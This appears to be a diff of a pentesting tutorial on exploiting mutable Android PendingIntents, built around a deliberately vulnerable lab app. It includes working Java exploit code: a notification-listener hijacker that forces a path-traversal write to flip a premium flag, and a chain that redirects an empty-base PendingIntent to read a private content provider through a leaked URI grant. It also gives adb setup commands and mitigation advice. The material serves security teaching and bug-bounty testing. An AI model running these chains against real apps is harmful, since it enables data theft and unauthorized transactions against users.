@@ -8,65 +8,51 @@ render_with_liquid: false
 ---
 
 
-Android 12 changed the default for `PendingIntent.FLAG_MUTABLE`, apps targeting API 31+ now have to opt in, and Google rolled out a deprecation warning. Despite the warning, mutable PendingIntents are still everywhere, especially in third-party SDKs that have not been updated, push notification handlers, and "share with this widget" surfaces. When the app passes a mutable PendingIntent to another component (notification system, widget host, AlarmManager), the receiving component can modify the intent's extras before firing it. If the original PendingIntent was meant to launch an internal activity, the modifier just got an injection vector into that internal activity.
+A PendingIntent is a signed blank cheque. The app fills in some details, signs it with its own identity and permissions, and hands it to someone else, the notification system, a widget host, AlarmManager, or another app. When the holder cashes it (`PendingIntent.send()`), Android honours the wrapped Intent **as if the original app fired it** — same UID, same permissions, same access to that app's internal components and content providers. That borrowed identity is the whole bug. If the app left parts of the cheque blank and made it mutable, the holder fills in the blanks and spends the app's identity however they like.
 
 <aside class="lab">
   <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabApp">VulnLabApp</a></p>
   <ul>
-    <li><code>android/app/src/main/java/com/vulnlab/app/activities/NotificationActivity.java</code> (notification-fired mutable PI)</li>
+    <li><code>android/app/src/main/java/com/vulnlab/app/activities/NotificationActivity.java</code> (fixed-base PI on a button; empty-base PI via <code>--ez post_empty_pi true</code>)</li>
     <li><code>android/app/src/main/java/com/vulnlab/app/services/AlarmService.java</code> (AlarmManager-fired mutable PI)</li>
+    <li><code>android/app/src/main/java/com/vulnlab/app/providers/SecretProvider.java</code> (private provider, stolen via a leaked URI grant)</li>
   </ul>
 </aside>
 
-<br>**The mechanism**
+<br>**Three things decide how bad it is**
 
-A PendingIntent wraps an Intent and a permission to fire it on the originating app's behalf. When the wrapping app calls `PendingIntent.send()`, the wrapped Intent fires with the wrapping app's UID, same permissions, same internal-activity access. The flags matter. Both VulnLabApp surfaces look like this:
+1. **Is it mutable?** `FLAG_MUTABLE` (or pre-API-31 default) lets the holder write on the cheque before cashing it — that write is `Intent.fillIn()`.
+2. **How blank did the app leave the base intent?** `fillIn()` can only write into fields the base left empty. A base with a fixed component is nearly safe; an empty `new Intent()` is a blank cheque.
+3. **Can the attacker get the cheque?** A notification (read via a `NotificationListenerService`), an app widget, a SliceProvider/MediaBrowserService, an AlarmManager entry, or a PendingIntent passed in an extra.
 
-```java
-// NotificationActivity — notification with a mutable PI
-Intent targetIntent = new Intent(this, FileWriteActivity.class);
-targetIntent.putExtra("_original_extra", "safe_value");
+<br>**What fillIn lets the holder change**
 
-int piFlags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE;
-PendingIntent pi = PendingIntent.getActivity(this, 1, targetIntent, piFlags);
+`fillIn(other)` merges the holder's intent into the base, field by field. The rule that confuses everyone: a field is copied from the holder **only if the base left it empty** (or the holder sets the matching `FILL_IN_*` flag).
 
-new NotificationCompat.Builder(this, CHANNEL)
-    .setContentTitle("VulnLabApp: Action Required")
-    .setContentIntent(pi)
-    .build();
-```
+| Field | Can the holder set it? |
+|---|---|
+| `action`, `data`, `type`, `package`, `categories`, `clipData` | Yes — **if the base left it empty** |
+| `component`, `selector` | No — unless the holder passes `FILL_IN_COMPONENT` / `FILL_IN_SELECTOR` |
+| extras | Always merged — but the **base wins** on key conflicts |
+| `FLAG_GRANT_READ/WRITE_URI_PERMISSION` | Yes — rides along on the fillIn intent |
 
-```java
-// AlarmService — scheduled mutable PI
-Intent target = new Intent(this, FileWriteActivity.class);
-target.putExtra("type", "config");
+Two consequences fall straight out of this table, and they are the two tiers of the bug:
 
-int flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE;
-PendingIntent pi = PendingIntent.getActivity(this, 100, target, flags);
-am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60_000L, pi);
-```
-
-`FLAG_MUTABLE` means whoever holds the PendingIntent can call `fillIn()` to merge their own extras into the wrapped Intent before firing. The wrapped activity then receives a hybrid Intent, the original component target, but with attacker-supplied extras.
-
-The bug is two-step. First, the app constructs a `MUTABLE` PendingIntent. Second, the app hands that PendingIntent to a component that the attacker can interact with, typically:
-
-- A notification posted via `NotificationManager` (the attacker is the user tapping the notification, or another app that can read notifications via the NotificationListenerService)
-- An app widget the user adds to their home screen
-- A `PendingIntent` set on `AlarmManager` (less attacker-reachable but possible)
-- A `PendingIntent` passed in an intent extra to another app
+- **Base has a fixed component** → the holder can only add *new* extras (extras merge, base wins). Bounded: "make the app do its thing, with my parameters." That is **Tier 1**.
+- **Base is empty / implicit** → the holder fills in `action` + `package` to steer the fire to their own component, fills in `data` + a URI grant flag, and walks off with whatever that app can reach. That is **Tier 2**, and it is where the CVEs live.
 
 <br>**Spotting it**
 
-Grep the decompile for `PendingIntent.FLAG_MUTABLE` and `PendingIntent.getActivity` / `getBroadcast` / `getService`:
+Grep the decompile for `PendingIntent.FLAG_MUTABLE` and the factory calls:
 
 ```java
 PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
 PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_MUTABLE);
 ```
 
-For each match, walk forward, where does the resulting PendingIntent end up? If it ends up in a `Notification.Builder.setContentIntent()` and the notification action targets an internal activity that reads its extras for sensitive decisions, you have the chain.
+For each, look at the base intent. Is its component set, or is it `new Intent()` / an implicit action? That single fact decides Tier 1 vs Tier 2. Then walk forward: where does the PendingIntent go (notification, widget, extra)?
 
-Frida confirmation, hook the PendingIntent factory to log the flags and the wrapped intent:
+Frida confirmation, hook the factory to log the flags and whether the base is explicit:
 
 ```javascript
 Java.perform(function () {
@@ -81,11 +67,34 @@ Java.perform(function () {
 });
 ```
 
-Trigger the flow in the app (push notification arrival, widget pin, etc.). The trace shows every PendingIntent the app builds and whether it is mutable.
+`target=implicit` is the Tier-2 tell. Heads-up on the `mutable` boolean: it only checks the explicit `FLAG_MUTABLE` bit. Pre-API-31, PendingIntents are mutable *by default*, so on Android ≤ 11 a PI built without the flag still prints `mutable=false` here yet is fully hijackable. `mutable=false` only rules the bug out from API 31+.
 
-<br>**The notification path**
+Trigger the surfaces so the PendingIntents get built:
 
-Most exploitable path. The app posts a notification with a mutable PendingIntent as the content action. Some other app on the device, yours, registers a `NotificationListenerService` (requires user permission, but the permission is the kind a "smart notification cleaner" app legitimately asks for). The listener service receives the notification, extracts the PendingIntent, calls `fillIn()` with attacker extras, and fires.
+```bash
+# Tier 1: fixed-base PI button → tap the "mutable PI" button, or:
+adb shell am start -n com.vulnlab.app/.activities.NotificationActivity
+
+# Tier 2: empty-base PI
+adb shell am start -n com.vulnlab.app/.activities.NotificationActivity --ez post_empty_pi true
+
+# AlarmManager-fired mutable PI (fires ~60s later)
+adb shell am start-service -n com.vulnlab.app/.services.AlarmService
+```
+
+<br>**Tier 1 — fixed base intent, inject extras**
+
+VulnLabApp's notification button wraps a *fixed* component, so the base looks like this:
+
+```java
+Intent targetIntent = new Intent(this, FileWriteActivity.class);   // component is locked
+targetIntent.putExtra("_original_extra", "safe_value");
+int piFlags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE;
+PendingIntent pi = PendingIntent.getActivity(this, 1, targetIntent, piFlags);
+// ... attached as a notification's setContentIntent(pi)
+```
+
+The component is fixed at `FileWriteActivity`, so the holder can't redirect — but it *can* add extras the base didn't set. Grab the PendingIntent from the notification and fill it in:
 
 ```java
 public class NotificationHijacker extends NotificationListenerService {
@@ -95,63 +104,116 @@ public class NotificationHijacker extends NotificationListenerService {
         PendingIntent pi = sbn.getNotification().contentIntent;
         if (pi == null) return;
         try {
+            // extras merge, base wins on conflicts — you inject NEW keys, not overwrite
             Intent fillIn = new Intent();
-            // VulnLabApp wraps FileWriteActivity — overwrite the original extra
-            fillIn.putExtra("_original_extra", "attacker_value");
-            fillIn.putExtra("filename", "/data/data/com.vulnlab.app/files/owned");
-            fillIn.putExtra("content",  "pwned");
+            fillIn.putExtra("filename", "../shared_prefs/auth_prefs.xml");
+            fillIn.putExtra("content",  "<?xml version='1.0'?><map>"
+                + "<boolean name=\"premium\" value=\"true\" /></map>");
             pi.send(this, 0, fillIn);
         } catch (CanceledException ignored) {}
     }
 }
 ```
 
-The PendingIntent fires the target's internal activity (`FileWriteActivity` in VulnLabApp's case) with the attacker's extras merged in. The activity processes the action thinking the notification was tapped by the user.
+Register the listener and grant it notification access (it won't fire until access is enabled — this same listener is the acquisition path for Tier 2 too):
 
-If the activity reads `user_id` to identify "whose notification was this", that is identity confusion. If it reads `amount` and `authorize` to silently complete a queued transaction, that is unauthorized action. Severity depends on what the activity does.
-
-<br>**The widget path**
-
-App widgets are another mutable-PendingIntent surface. The widget host (the launcher) holds the PendingIntent. An attacker app that can read the widget, or that registers as a custom launcher / widget host, can fire it with mutated extras. Less common but seen in apps with home-screen-pinned banking widgets that expose "transfer to last recipient" actions.
-
-<br>**The cross-app intent-extra path**
-
-Some apps pass PendingIntents in extras to other apps, for example, "if you want me to call back with the result, here is a PendingIntent you can fire". If the receiving app holds the PendingIntent for any time and is itself compromisable, the PendingIntent leaks. If the receiving app is the attacker's own app, the leak is direct:
-
-```java
-// The target's "share with my app" feature sends a callback PendingIntent.
-Intent share = new Intent("com.attacker.action.SHARE_CALLBACK");
-PendingIntent callback = PendingIntent.getActivity(
-    this, 0, callbackIntent,
-    PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
-share.putExtra("callback", callback);
-sendBroadcast(share);
+```xml
+<service
+    android:name=".NotificationHijacker"
+    android:exported="false"
+    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+    <intent-filter>
+        <action android:name="android.service.notification.NotificationListenerService" />
+    </intent-filter>
+</service>
 ```
 
-The attacker's broadcast receiver gets the PendingIntent. The attacker then mutates extras and fires.
+```bash
+# Real device: user toggles Settings → Notification access. Test device:
+adb shell cmd notification allow_listener \
+  com.root3d.myapplication77/com.root3d.myapplication77.NotificationHijacker
+```
+
+With access on, fire `NotificationActivity` to post the notification. The listener catches it, adds `filename`/`content` (keys the base never set) and fires the PendingIntent into `FileWriteActivity` — which does the path-traversal write *as VulnLabApp*. Bounded, but real: you made the app overwrite its own `auth_prefs.xml` and flip `premium=true`.
+
+<br>**Tier 2 — empty base intent, redirect and steal a content provider**
+
+This is the dangerous one, and the one all the CVEs (CVE-2020-0188 `SettingsSliceProvider`, CVE-2020-0389 SystemUI `RecordingService`) are instances of. The app builds the PendingIntent from an **empty** base:
+
+```java
+// VulnLabApp: --ez post_empty_pi true posts a notification with this
+PendingIntent leak = PendingIntent.getActivity(
+    this, 2, new Intent(),   // empty base — every field is blank
+    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
+```
+
+Now the holder controls almost everything. Per the table, they fill in `action` + `package` to steer the fire into their *own* component (they can't set `component` directly, but `package` + `action` resolves there), and `data` + `FLAG_GRANT_READ_URI_PERMISSION` to make the app grant them a URI. Point that URI at a provider the attacker can't reach but the app can — VulnLabApp's private `SecretProvider` (`exported="false"`):
+
+```java
+// in the same NotificationListenerService
+PendingIntent pi = sbn.getNotification().contentIntent;        // the empty-base PI
+Intent fillIn = new Intent("com.attacker.GRANT");              // base action empty → fills
+fillIn.setPackage("com.root3d.myapplication77");              // steer the fire to our app
+fillIn.setData(Uri.parse("content://com.vulnlab.app.secret/token")); // base data empty → fills
+fillIn.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);       // rides along on the fillIn
+pi.send(this, 0, fillIn);
+```
+
+The fire resolves to your own activity, which receives the intent *with a live read grant* on the private provider:
+
+```java
+public class GrantReceiver extends Activity {
+    @Override protected void onCreate(Bundle b) {
+        super.onCreate(b);
+        try {
+            Uri u = getIntent().getData();                     // content://com.vulnlab.app.secret/token
+            InputStream is = getContentResolver().openInputStream(u);
+            // exfil is — the secret token/api_key, from a provider you can't query directly
+        } catch (Exception ignored) {}
+        finish();
+    }
+}
+```
+
+```xml
+<activity android:name=".GrantReceiver" android:exported="true">
+    <intent-filter>
+        <action android:name="com.attacker.GRANT" />
+        <category android:name="android.intent.category.DEFAULT" />
+    </intent-filter>
+</activity>
+```
+
+The key rule (this is what makes it "arbitrary" content provider access): **if VulnLabApp itself couldn't read `content://com.vulnlab.app.secret`, the grant flag would be silently ignored.** It can — it owns the provider — so the read transfers to you, and `grantUriPermissions="true"` makes the grant bypass `exported="false"`. You just read a provider you could never have queried directly. Aim the same trick at a provider the *victim* app's permissions cover (its own private data, or a system provider like contacts/SMS if the app holds the permission) and the impact is whatever that app could read.
+
+<br>**Other reach paths**
+
+The notification listener is the most reachable acquisition today, but the same two tiers apply anywhere the PendingIntent leaks:
+
+- **App widgets.** The launcher (widget host) holds the PendingIntent; a custom launcher / widget host fires it with mutated extras. Seen in home-screen banking widgets with "transfer to last recipient" actions.
+- **Cross-app extra.** Some apps pass a callback PendingIntent in an extra ("fire this when you're done"). If the receiver is your app, the leak is direct — mutate and fire.
 
 <br>**What you actually achieve**
 
-The impact ladder for this primitive:
+- **Tier 1 — identity / action injection.** The internal activity reads `user_id` / `account_id` / `authorize` from the extras. Swap them: IDOR onto another user, or silently complete a queued transaction the user never confirmed. Stale-extra replay is the nasty variant — the base's original nonce stays (base wins), so you keep the real user's nonce and add your own amount fields.
+- **Tier 2 — arbitrary content provider read.** Steal data from a private or permission-protected provider using the app's identity. This is the critical-tier outcome, and the one worth chasing on any app with rich notifications.
 
-**Identity injection.** The internal activity reads `user_id` / `account_id` from the PendingIntent's extras. Originally the app put the legitimate user's ID there. Attacker swaps it. The activity now operates on the attacker's chosen identity, usually IDOR on a different user's account.
+<br>**Mitigation, and what to look for**
 
-**Action authorization bypass.** Activities that read "did the user just confirm via notification tap?" from the intent's extras. Attacker forges the confirm extras. The action, usually transactional, completes without the user ever seeing the notification.
+The fix is `FLAG_IMMUTABLE`, plus never building a PendingIntent from an empty/implicit base. Developers don't, because third-party SDKs (analytics, push, ads) demand mutable PendingIntents to inject their own extras at fire time — so grep the SDK `jar`/`aar` files too, not just app code. SDK-side mutable PendingIntents are still the app's bug from a bounty perspective.
 
-**Stale-extra replay.** The PendingIntent's original wrapped intent already has extras (request IDs, nonces). `fillIn()` merges new extras in but does not replace the existing ones. Combine the original nonce with attacker-supplied amount fields to authorize-as-the-real-user but spend-as-the-attacker.
-
-<br>**The mitigation, and what to look for**
-
-The fix is replacing `FLAG_MUTABLE` with `FLAG_IMMUTABLE`. The reason developers do not, third-party SDKs (analytics, push services, ad networks) often demand mutable PendingIntents because they want to inject their own tracking extras at fire time. The fix in the app code does not help if the SDK is what is constructing the PendingIntent.
-
-For analysts: do not stop at the app's own code. Grep the SDK jar / aar files inside the decompile for `PendingIntent.FLAG_MUTABLE`. SDK-side mutable PendingIntents are still the app's bug from a bounty perspective, the app shipped the SDK that posts the notification.
-
-<br>**The Android 14 narrowing**
-
-API 34 added partial mitigations, `fillIn` cannot override certain fields, and the PendingIntent retains some immutability for its component target. The extras path is still mutable. The fields that are now fixed are the action, data URI, and component. The extras are still attacker-injectable, which is what most of these chains exploit.
+Android has been narrowing this: API 31 forced an explicit `FLAG_MUTABLE`/`FLAG_IMMUTABLE` choice, and **API 34 blocks creating a mutable PendingIntent from an implicit base** — which kills Tier 2 at creation for compliant apps targeting 34+. Tier 1 (explicit-component base + mutable) is still allowed and still extras-injectable, and pre-34 apps / unpatched SDKs still ship the empty-base form.
 
 <br>**Closing**
 
-Mutable PendingIntents are one of those bugs that survived a framework deprecation because the third-party SDK ecosystem did not move with it. The chain, app builds mutable PI, app passes it to a receiver, receiver is reachable by an attacker app, attacker mutates extras, fires every time the conditions line up. The notification-listener path is the most reachable today. Worth checking on every banking or fintech app with rich push notifications.
+Hold the cheque model and the fillIn table and the rest follows: mutable means writable, an empty base means a blank cheque, and `send()` cashes it with the app's identity. Tier 1 makes the app act with your parameters; Tier 2 makes the app hand you data it alone could reach. The notification-listener path reaches both. Worth checking on every banking or fintech app with rich push notifications.
 
-Happy Hacking !!
+<br>**References**
+
+- [https://valsamaras.medium.com/pending-intents-a-pentesters-view-92f305960f03](https://valsamaras.medium.com/pending-intents-a-pentesters-view-92f305960f03)
+- [https://oversecured.com/blog/gaining-access-to-arbitrary-content-providers](https://oversecured.com/blog/gaining-access-to-arbitrary-content-providers)
+- [https://segmentfault.com/a/1190000041532963/en](https://segmentfault.com/a/1190000041532963/en)
+- [https://segmentfault.com/a/1190000041550819](https://segmentfault.com/a/1190000041550819)
+- [https://hackerone.com/reports/1161401](https://hackerone.com/reports/1161401)
+
+</content>
